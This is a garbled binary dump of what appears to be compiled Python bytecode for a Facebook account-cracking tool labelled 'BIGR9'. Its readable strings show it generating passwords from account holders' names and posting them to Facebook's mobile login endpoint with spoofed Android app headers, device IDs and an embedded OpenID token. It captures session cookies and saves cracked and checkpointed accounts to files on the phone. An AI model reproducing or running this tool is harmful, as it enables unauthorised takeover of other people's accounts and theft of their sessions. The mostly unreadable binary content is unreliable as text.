\x1b[1;32mr(\x00\x00\x00r\x02\x00\x00\x00rR\x00\x00\x00\xda\x05first\xda\x05First\xda\x04last\xda\x04Last\xda\x04Name\xda\x04name\xa9\x01\xfa2256002347743983%7C374e60f8b9bb6b8cbb30f78030438895\xe9o\x00\x00\x00rS\x00\x00\x00r\x18\x00\x00\x00r\x16\x00\x00\x00r,\x00\x00\x00rX\x00\x00\x00\xe9\xc7k\x9f\x06\xe9\xff\xc9\x9a;r~\x00\x00\x00r\x7f\x00\x00\x00r\x80\x00\x00\x00r\x81\x00\x00\x00r\x82\x00\x00\x00r\x83\x00\x00\x00r\x84\x00\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r\x87\x00\x00\x00r{\x00\x00\x00rV\x00\x00\x00\xda\x04FB4Ar\x10\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xa9V\xda\x08X697X663\xda\x05X663B\xda\x06PR652B\xda\x04X267\xda\x05X5010\xda\x04X521\xda\x06X5514D\xda\x05X5515\xda\x06X5515F\xda\x04X559\xda\x05X559C\xda\x05X559F\xda\x04X571\xda\x04X572\xda\x04X573\xda\x05X573B\xda\x04X601\xda\x04X603\xda\x04X604\xda\x05X604B\xda\x04X605\xda\x04X606\xda\x05X606B\xda\x05X606C\xda\x05X606D\xda\x04X608\xda\x04X609\xda\x04X610\xda\x05X610B\xda\x04X612\xda\x05X612B\xda\x04X620\xda\x05X620B\xda\x04X622\xda\x04X623\xda\x05X623B\xda\x04X624\xda\x05X624B\xda\x04X625\xda\x05X625B\xda\x05X625D\xda\x04X626\xda\x05X626B\xda\x05X627V\xda\x04X650\xda\x05X650B\xda\x05X650C\xda\x05X650D\xda\x04X652\xda\x05X652A\xda\x05X652B\xda\x05X652C\xda\x04X653\xda\x05X653C\xda\x04X655\xda\x05X655C\xda\x05X655D\xda\x05X655F\xda\x04X656\xda\x04X657\xda\x05X657B\xda\x05X657C\xda\x05X659B\xda\x04X660\xda\x05X660B\xda\x05X660C\xda\x04X680\xda\x05X680B\xda\x05X680C\xda\x05X682B\xda\x05X682C\xda\x04X683\xda\x04X687\xda\x05X687B\xda\x05X688B\xda\x05X688CrG\x01\x00\x00\xda\x04X689\xda\x05X689B\xda\x05X689C\xda\x04X690\xda\x05X690B\xda\x04X692\xda\x04X693\xda\x04X695\xda\x05X695C\xe9+\x02\x00\x00r\x19\x00\x00\x00r\x1a\x00\x00\x00\xa9\x06\xda\x04Zongr\x13\x00\x00\x00\xda\nBanglalinkry\x00\x00\x00\xda\x0bMarshmallowz\rTelekom China\xe1\xb0\x04\x00\x00[FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]ru\x00\x00\x00\xe9\x10\x00\x00\x00\xa9\x01\xda\x01k\xe9\x14\x00\x00\x00\xfa\x02["\xfa\x02"]\xa9\x03\xda\x0228\xda\x0229\xda\x03210c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x003\x00\x00\x00\xf3N\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]\x1d\x00\x00}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x96\x01\x97\x01\x01\x00\x8c\x1f\x04\x00y\x00\xad\x03w\x01\xa9\x01N\xa9\x03r\x1d\x00\x00\x00r\x1e\x00\x00\x00\xda\x06digits\xa9\x02\xda\x02.0\xda\x01_s\x02\x00\x00\x00  r(\x00\x00\x00\xda\t<genexpr>z\x19newidx.<locals>.<genexpr>\x17\x01\x00\x00\xf3\x1a\x00\x00\x00\xe8\x00\xf8\x80\x00\xd0$M\xc1H\xb8q\xa4V\xa7]\xa1]\xb46\xd7%:\xc1H\xf9\xf3\x04\x00\x00\x00\x82#%\x01\xe9\x02\x00\x00\x00\xda\x04adid\xda\x06format\xda\x04json\xda\tdevice_id\xda\x10family_device_id\xda\x17secure_family_device_id\xda\x03cpl\xda\x04true\xda\x07try_num\xda\x05email\xda\x08password\xda\x06method\xfa\nauth.login\xda\x18generate_analytics_claim\xda\x0ccommunity_id\xda\x0bsim_serials\xfa\x18[\'80973453345210784798\']\xda\x0bopenid_flow\xda\randroid_login\xda\x0fopenid_provider\xda\x06google\xda\ropenid_emails\xfa\x0f[\'01710940017\']\xda\ropenid_tokens\xe1\xf6\x03\x00\x00[\'eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g\']\xda fb4a_shared_phone_cpl_experiment\xda&fb4a_shared_phone_nonce_cpl_at_risk_v3\xda\x1bfb4a_shared_phone_cpl_group\xda\x11enable_v3_at_risk\xda\x0eenroll_misauth\xda\x05false\xda\x18generate_session_cookies\xda\x11error_detail_type\xda\x14button_with_disabled\xda\x06source\xda\x10account_recovery\xda\x13generate_machine_id\xda\x07jazoest\xda\x042980\xda\x0fmeta_inf_fbmeta\xda\x0bV2_UNTAGGED\xda\x10encrypted_msisdn\xda\x1acurrently_logged_in_userid\xda\x06locale\xda\x13client_country_code\xda\x02US\xda\x18fb_api_req_friendly_name\xda\x0bautheticate\xda\x13fb_api_caller_class\xda\x0fFb4aAuthHandler\xda 882a8490361da98702bf97a021ddc14dr\xf6\x00\x00\x00\xda 4c854da0db9429f4913c2a1b221c1d30\xa9\x03\xda\x07api_key\xda\x0caccess_token\xda\x03sig\xda\x04Host\xfa\x14b-graph.facebook.com\xfa\x0cContent-Type\xfa!application/x-www-form-urlencoded\xfa\x0fAccept-Encoding\xfa\rgzip, deflate\xda\nConnection\xfa\nkeep-alive\xda\x04POST\xfa\x12/auth/login HTTP/2\xda\x08Priority\xfa\x06u=3, i\xfa\x0cX-Fb-Sim-Hni\xda\x0564301\xfa\x0cX-Fb-Net-Hni\xfa\x17X-Fb-Connection-Quality\xda\x04GOOD\xfa\nZero-Rated\xfa\nUser-Agent\xda\tEXCELLENT\xda\rAuthorization\xfa\nOAuth null\xfa\x19X-Fb-Connection-Bandwidth\xda\x0824807555\xfa\x14X-Fb-Connection-Type\xfa\nMOBILE.LTE\xda\x046060\xda\x05False\xda\x0cauthenticate\xda\x07unknown\xda\x05Liger\xda\x04True\xda\x042126\xa9\x08z\x11X-Fb-Device-Group\xfa\x10X-Tigon-Is-Retryz\x12X-Fb-Friendly-Namez\x1bX-Fb-Request-Analytics-Tagsz\x10X-Fb-Http-Enginez\x0eX-Fb-Client-Ipz\x13X-Fb-Server-Clusterz\x0eContent-Length\xfa\'https://b-graph.facebook.com/auth/login\xfaKLogin approvals are on. Expect an SMS shortly with a code to use for log in\xa9\x02\xda\x04data\xda\x07headers\xda\x0bsession_key\xfa\x15\r\r\x1b[1;32m [BIGR9-OK] \xfa\x03 | \xfa\x07\x1b[1;97mr-\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x003\x00\x00\x00\xf38\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]\x12\x00\x00}\x01|\x01d\x00\x19\x00\x00\x00d\x01z\x00\x00\x00|\x01d\x02\x19\x00\x00\x00z\x00\x00\x00\x96\x01\x97\x01\x01\x00\x8c\x14\x04\x00y\x03\xad\x03w\x01\xa9\x04r\xf4\x00\x00\x00\xda\x01=\xda\x05valueNr\x8e\x00\x00\x00\xa9\x02rf\x01\x00\x00r\xe3\x00\x00\x00s\x02\x00\x00\x00  r(\x00\x00\x00rh\x01\x00\x00z\x19newidx.<locals>.<genexpr>\\\x01\x00\x00\xf3%\x00\x00\x00\xe8\x00\xf8\x80\x00\xd07p\xd1Zo\xd0UV\xb8\x01\xb8&\xb9\t\xc0#\xb9\r\xc0a\xc8\x07\xc1j\xd58P\xd1Zo\xf9\xf3\x04\x00\x00\x00\x82\x18\x1a\x01\xda\x0fsession_cookies\xfa\x12\r\r\x1b[1;33m Cookie: \xfa\x17/sdcard/BIGR9-M1-OK.txt\xda\x01ar\xc2\x00\x00\x00rw\x00\x00\x00r\xbd\x00\x00\x00\xfa\x15\r\r\x1b[1;34m [BIGR9-2F] \xfa\x10www.facebook.com\xda\x05error\xda\x07message\xfa\x15\r\r\x1b[1;31m [BIGR9-CP] \xfa\x17/sdcard/BIGR9-M1-CP.txtr\x05\x00\x00\x00\xa9)\xda\x03sys\xda\x06stdout\xda\x05write\xda\x04loopr\xb6\x00\x00\x00r\xd6\x00\x00\x00\xda\x05flushr\xd2\x00\x00\x00\xda\x07replace\xda\x05lowerr\x1d\x00\x00\x00r \x00\x00\x00r\x1f\x00\x00\x00\xda\x06device\xda\x06sim_idr\x1e\x00\x00\x00r!\x00\x00\x00\xda\x06Random\xda\x04join\xda\x07choices\xda\x06string\xda\thexdigits\xda\x04uuid\xda\x05uuid4rd\x01\x00\x00r\xce\x00\x00\x00r0\x00\x00\x00r\xd8\x00\x00\x00\xda\x04postrn\x01\x00\x00r\x8c\x00\x00\x00r\xc6\x00\x00\x00r\xcf\x00\x00\x00r\xd0\x00\x00\x00r\xd7\x00\x00\x00r\xd9\x00\x00\x00r\xda\x00\x00\x00r\xca\x00\x00\x00r\xcb\x00\x00\x00\xda\x04api3\xda\tException\xa90r\xe8\x00\x00\x00r\xe9\x00\x00\x00r\xea\x00\x00\x00\xda\x02fn\xda\x02ln\xda\x02pw\xda\x03pas\xda\x0baccessToken\xda\x04fbav\xda\x04fbbvr~\x00\x00\x00r\x7f\x00\x00\x00r\x80\x00\x00\x00r\x81\x00\x00\x00r$\x00\x00\x00r\x82\x00\x00\x00r\x83\x00\x00\x00r\x84\x00\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r\x87\x00\x00\x00\xda\x04fbfw\xda\x04fbrv\xda\x04fban\xda\x04fbpnr"\x00\x00\x00\xda\x06inform\xda\x03ams\xda\x07networkr\'\x00\x00\x00\xda\x0brandom_seedrl\x01\x00\x00ro\x01\x00\x00\xda\x06secure\xda\x06familyr\xdd\x00\x00\x00r{\x01\x00\x00\xda\x02li\xda\x03li2\xda\x02j1r\x91\x01\x00\x00r\xca\x01\x00\x00r\xcb\x01\x00\x00\xda\x03url\xda\x03twf\xda\x02po\xda\x04cokir&\x00\x00\x00s0\x00\x00\x00                                                r(\x00\x00\x00r\xd5\x00\x00\x00r\xd5\x00\x00\x00\xeb\x00\x00\x00\xf3\r\x08\x00\x00\x80\x00\xf0\x02K\x02\t\x15\xe4\x10\x13\x97\n\x91\n\xd7\x10 \xd2\x10 \xd6mq\xd4ru\xd4vy\xd5rz\xd0!{\xd4\x10|\xf4\x00\x00~\x01A\x02\xf7\x00\x00~\x01H\x02\xf1\x00\x00~\x01H\x02\xf7\x00\x00~\x01N\x02\xf1\x00\x00~\x01N\x02\xf4\x00\x00~\x01P\x02\xd8\x15\x1a\x97[\x91[\xa0\x13\xd3\x15%\xa0a\xd1\x15(\x90\x02\xf0\x02\x03\x11 \xd8\x1d"\x9f[\x99[\xa8\x13\xd3\x1d-\xa8a\xd1\x1d0\x98\x02\xf4\x06\x00\x1b#\x90B\xd8\x1e \x9fj\x99j\xa8\x17\xb0\x12\xb7\x18\xb1\x18\xb3\x1a\xd3\x1e<\xd7\x1eD\xd1\x1eD\xc0W\xc8R\xd3\x1eP\xd7\x1eX\xd1\x1eX\xd0Y_\xd0`b\xd7`h\xd1`h\xd3`j\xd3\x1ek\xd7\x1es\xd1\x1es\xd0tz\xd0{}\xd3\x1e~\xf7\x00\x00\x1fG\x02\xf1\x00\x00\x1fG\x02\xf0\x00\x00H\x02N\x02\xf0\x00\x00O\x02T\x02\xf3\x00\x00\x1fU\x02\xf7\x00\x00\x1f]\x02\xf1\x00\x00\x1f]\x02\xf0\x00\x00^\x02d\x02\xf0\x00\x00e\x02j\x02\xf7\x00\x00e\x02p\x02\xf1\x00\x00e\x02p\x02\xf3\x00\x00e\x02r\x02\xf3\x00\x00\x1fs\x02\x98\x03\xd8&[\x98\x0b\xdc"(\xa7.\xa1.\xb0\x13\xb0S\xd3"9\xd0!:\xb8%\xc4\x06\xc7\x0e\xc1\x0e\xc8r\xd0RT\xd3@U\xd0?V\xd0VW\xd4X^\xd7Xf\xd1Xf\xd0gj\xd0kn\xd3Xo\xd0Wp\xd0\x1fq\x98\x04\xdc\x1f"\xa46\xa7>\xa1>\xb0)\xb8I\xd3#F\xd3\x1fG\x98\x04\xdc*0\xd01B\xd1*C\x98\x0f\xdc &\xa0w\xa1\x0f\x98\x05\xdc &\xa0w\xa1\x0f\x98\x05\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xd8\x1f"\x98\x04\xd8\x1f"\x98\x04\xd8\x1f%\x98\x04\xd8\x1f4\x98\x04\xdc\x1d#\x9f]\x99]\xa8G\xb0G\xd0+<\xd3\x1d=\x98\x02\xdc!\'\xa7\x1d\xa1\x1d\xf2\x00\x000F\x0b\xf3\x00\x00"G\x0b\x98\x06\xdc\x1e!\xa4&\xa7.\xa1.\xb0\x13\xb0S\xd3"9\xd3\x1e:\xb87\xd1\x1eB\xc43\xc4v\xd7GW\xd1GW\xd0XY\xd0Z\\\xd3G]\xd3C^\xd1\x1e^\xd4_b\xd4ci\xd7cq\xd1cq\xd0ru\xd0vy\xd3cz\xd3_{\xd1\x1e{\x98\x03\xdc"(\xa7-\xa1-\xd20s\xd3"t\x98\x07\xf0\x02\x00\x1f]\x13\x98\x02\xdc&,\xa7m\xa1m\xa3o\x98\x0b\xdc\x1f"\xa02\xa77\xa17\xa8;\xd7+>\xd1+>\xbcv\xd7?O\xd1?O\xd0SU\xd0+>\xd3+V\xd3#W\xd3\x1fX\x98\x04\xdc$\'\xac\x04\xaf\n\xa9\n\xab\x0c\xd3$5\x98\t\xdc!$\xa4T\xa7Z\xa1Z\xa3\\\xd3!2\x98\x06\xdc!$\xa4T\xa7Z\xa1Z\xa3\\\xd3!2\x98\x06\xd8&[\x98\x0b\xdc\x1c\x1f\xa0\x02\xa7\x07\xa1\x07\xa8\x0b\xd7(;\xd1(;\xbcF\xbfM\xb9M\xc8R\xd0(;\xd3(P\xd3 Q\xd3\x1cR\x98\x02\xd8(*\xa82\xa8$\xa8b\xa0k\x98\x0b\xda\x1d.\x98\x02\xdc\x1e$\x9fm\x99m\xa8B\xd3\x1e/\x98\x03\xd8\x1d\x1f\x9fW\x99W\xd1$M\xc4E\xc8!\xc4H\xd3$M\xd3\x1dM\x98\x02\xd8"%\xa0b\xa1&\x98\x07\xf0\x02$ *\xa0\x06\xa8\x04\xf0\x00$ *\xd8\x00\x08\x88&\xf0\x03$ *\xe0\x00\x0b\x8cS\x94\x14\x97\x1a\x91\x1a\x93\x1c\xd3\r\x1e\xf0\x05$ *\xf0\x06\x00\x01\x13\x94C\x9c\x04\x9f\n\x99\n\x9b\x0c\xd3\x14%\xf0\x07$ *\xf0\x08\x00\x01\x1a\x9c3\x9ct\x9fz\x99z\x9b|\xd3\x1b,\xf0\t$ *\xf0\n\x00\x01\x06\x80v\xf0\x0b$ *\xf0\x0c\x00\x01\n\x883\xf0\r$ *\xf0\x0e\x00\x01\x08\x88\x13\xf0\x0f$ *\xf0\x10\x00\x01\x0b\x88C\xf0\x11$ *\xf0\x12\x00\x01\t\x88,\xf0\x13$ *\xf0\x14\x00\x01\x1b\x983\xf0\x15$ *\xf0\x16\x00\x01\x0f\x88r\xf0\x17$ *\xf0\x18\x00\x01\x06\x80f\xf0\x19$ *\xf0\x1a\x00\x01\n\x88#\xf0\x1b$ *\xf0\x1c\x00\x01\x0e\xd0\x0f)\xf0\x1d$ *\xf0\x1e\x00\x01\x0e\x88\x7f\xf0\x1f$ *\xf0 \x00\x01\x12\x908\xf1!$ *\xf0"\x00\x01\x10\xd0\x11"\xf0#$ *\xf0$\x00\x01\x10\xf0\x00\x00\x12J\x10\xf0%$ *\xf0&\x00\x01#\xd0#K\xf0\'$ *\xf0(\x00\x01\x1e\xd0\x1e1\xf0)$ *\xf0*\x00\x01\x11\x90\x17\xf0+$ *\xf0,\x00\x01\x1b\x983\xf0-$ *\xf0.\x00\x01\x14\xd0\x14*\xf0/$ *\xf00\x00\x01\t\xd0\t\x1b\xf01$ *\xf02\x00\x01\x16\x90c\xf03$ *\xf04\x00\x01\n\x88&\xf05$ *\xf06\x00\x01\x12\x90-\xf07$ *\xf08\x00\x01\x13\x902\xf09$ *\xf0:\x00\x01\x1d\x98S\xf0;$ *\xf0<\x00\x01\t\x88\'\xf0=$ *\xf0>\x00\x01\x16\x90t\xf0?$ *\xf0@\x01\x00\x01\x1b\x98=\xf0A\x01$ *\xf0B\x01\x00\x01\x16\xd0\x16\'\xf1C\x01$ *\xf0D\x01\x00\x0b-\xd8\x0fC\xd8\x06(\xf2I\x01$ *\x98\x04\xf0J\x01\x18!\x1a\xa0\x16\xd0)?\xf0\x00\x18!\x1a\xd8\x00\x0e\xd0\x103\xf0\x03\x18!\x1a\xe0\x00\x11\x90?\xf0\x05\x18!\x1a\xf0\x06\x00\x01\r\x88l\xf0\x07\x18!\x1a\xf0\x08\x00\x01\x07\xd0\x08\x1c\xf0\t\x18!\x1a\xf0\n\x00\x01\x07\xd0\x08\x1e\xf0\x0b\x18!\x1a\xf0\x0c\x00\x01\x0b\x88H\xf0\r\x18!\x1a\xf0\x0e\x00\x01\x0f\xd0\x103\xf0\x0f\x18!\x1a\xf0\x10\x00\x01\x0f\x90\x07\xf0\x11\x18!\x1a\xf0\x12\x00\x01\x0f\x90\x07\xf0\x13\x18!\x1a\xf0\x14\x00\x01\x1a\x986\xf0\x15\x18!\x1a\xf0\x16\x00\x01\r\x88c\xf0\x17\x18!\x1a\xf0\x18\x00\x01\r\xd4\x0e\x1f\xd3\x0e!\xf0\x19\x18!\x1a\xf0\x1a\x00\x01\x1a\x98;\xf0\x1b\x18!\x1a\xf0\x1c\x00\x01\x10\x90\x1c\xf0\x1d\x18!\x1a\xf0\x1e\x00\x01\x1c\x98Z\xf0\x1f\x18!\x1a\xf0 \x00\x01\x17\x98\x0c\xf0!\x18!\x1a\xf0"\x00\x16\x1c\xd8\x14\x1b\xd8\x16$\xd8\x1f(\xd8\x14\x1b\xd8\x12\x18\xd8\x17\x1d\xd8\x12\x18\xf21\x18!\x1a\x98\x07\xf02\x00\x1fH\x01\x98\x03\xd8\x1ez\x98\x03\xdc\x1d%\x9f]\x99]\xa83\xb0D\xc0\x17\xd4\x1dI\xd7\x1dN\xd1\x1dN\xd3\x1dP\x98\x02\xd8\x1b(\xa8B\xd1\x1b.\xdc(-\xd0.J\xc83\xd1.N\xc8u\xd1.T\xd0UX\xd1.X\xd0Ye\xd1.e\xd4(f\xd8/2\xafx\xa9x\xd17p\xd0Z\\\xd0]n\xd2Zo\xd37p\xd3/p\xa8\x04\xdc(-\xd0.G\xc8\x04\xd1.L\xd4(M\xdc(,\xd0-F\xc0s\xd3(K\xd7(Q\xd1(Q\xd0RU\xd0VY\xd1RY\xd0Z]\xd1R]\xd0^a\xd1Ra\xd0bf\xd1Rf\xd0gk\xd1Rk\xd4(l\xdc(+\xaf\n\xa9\n\xb03\xac\x0f\xd9(-\xd8\x1d \xa4C\xa8\x02\xa3G\x99^\xd8+.\xb4#\xab:\xdc05\xd06R\xd0SV\xd16V\xd0W\\\xd16\\\xd0]`\xd16`\xd40a\xd803\xb7\n\xb1\n\xb83\xb4\x0f\xd905\xd8\x1d/\xb02\xb0g\xb1;\xb8y\xd13I\xd1\x1dI\xd8+.\xb4#\xa9:\xdc05\xd08R\xd0TW\xd16W\xd0X]\xd16]\xd0^a\xd16a\xd0bn\xd16n\xd40o\xdc04\xd05N\xc8s\xd30S\xd70Y\xd10Y\xd0Z]\xd0^a\xd1Za\xd0be\xd1Ze\xd0fj\xd1Zj\xd40k\xd905\xf4\x06\x0015\xd05N\xc8s\xd30S\xd70Y\xd10Y\xd0Z]\xd0^a\xd1Za\xd0be\xd1Ze\xd0fj\xd1Zj\xd40k\xd905\xf1\x06\x00)1\xf0{\x03\x00\x1b#\xf4|\x03\x00\x11\x15\x90a\x91\x07\x91\x04\xf8\xf0A\x04\x01\x11 \xd8\x1d\x1f\x9b\x02\xfb\xf4@\x04\x00\x10\x18\xd7\x0f"\xd1\x0f"\xd7\x0f2\xd1\x0f2\xf2\x00\x02\t)\xdc\x10\x14\x97\n\x91\n\x981\x94\r\xdc\x10\x14\x90S\x98\x15\x98x\xd6\x10(\xdc\x0f\x18\xf2\x00\x01\t\x15\xdc\x10\x14\xfb\xf0\x03\x01\t\x15\xfa\xf38\x00\x00\x00\x82A)X0\x00\xc1,\x14X&\x00\xc2\x00S;X0\x00\xd5=B(X0\x00\xd8&\x04X-\x03\xd8*\x06X0\x00\xd80?Z\x03\x03\xd91\x08Z\x03\x03\xd9>\x05Z\x03\x03c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x03\x00\x00\x00\xf3\x0c\r\x00\x00\x97\x00\t\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01t\x06\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x01d\x02t\t\x00\x00\x00\x00\x00\x00\x00\x00t\n\x00\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x9b\x01d\x03\x9d\x05\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x01j\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xab\x01\x00\x00\x00\x00\x00\x00d\x05\x19\x00\x00\x00}\x03\t\x00|\x01j\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xab\x01\x00\x00\x00\x00\x00\x00d\x06\x19\x00\x00\x00}\x04|\x02D\x00\x90\x05]\x96\x00\x00}\x05|\x05j\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07|\x03j\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00j\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08|\x03\xab\x02\x00\x00\x00\x00\x00\x00j\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t|\x04j\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00j\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\n|\x04\xab\x02\x00\x00\x00\x00\x00\x00j\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0b|\x01\xab\x02\x00\x00\x00\x00\x00\x00j\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0c|\x01j\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00}\x06d\r}\x07t\x15\x00\x00\x00\x00\x00\x00\x00\x00j\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0ed\x0f\xab\x02\x00\x00\x00\x00\x00\x00\x9b\x00d\x10t\x15\x00\x00\x00\x00\x00\x00\x00\x00j\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x11d\x12\xab\x02\x00\x00\x00\x00\x00\x00\x9b\x00d\x13t\x15\x00\x00\x00\x00\x00\x00\x00\x00j\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0ed\x0f\xab\x02\x00\x00\x00\x00\x00\x00\x9b\x00\x9d\x05}\x08t\x19\x00\x00\x00\x00\x00\x00\x00\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00j\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x14d\x15\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00}\tt\x1a\x00\x00\x00\x00\x00\x00\x00\x00d\x16\x19\x00\x00\x00}\nt\x1a\x00\x00\x00\x00\x00\x00\x00\x00d\x17\x19\x00\x00\x00}\x0bt\x1a\x00\x00\x00\x00\x00\x00\x00\x00d\x18\x19\x00\x00\x00}\x0ct\x1a\x00\x00\x00\x00\x00\x00\x00\x00d\x19\x19\x00\x00\x00}\rt\x1c\x00\x00\x00\x00\x00\x00\x00\x00}\x0et\x1a\x00\x00\x00\x00\x00\x00\x00\x00d\x1a\x19\x00\x00\x00}\x0ft\x1a\x00\x00\x00\x00\x00\x00\x00\x00d\x1b\x19\x00\x00\x00}\x10t\x1a\x00\x00\x00\x00\x00\x00\x00\x00d\x1c\x19\x00\x00\x00}\x11t\x1a\x00\x00\x00\x00\x00\x00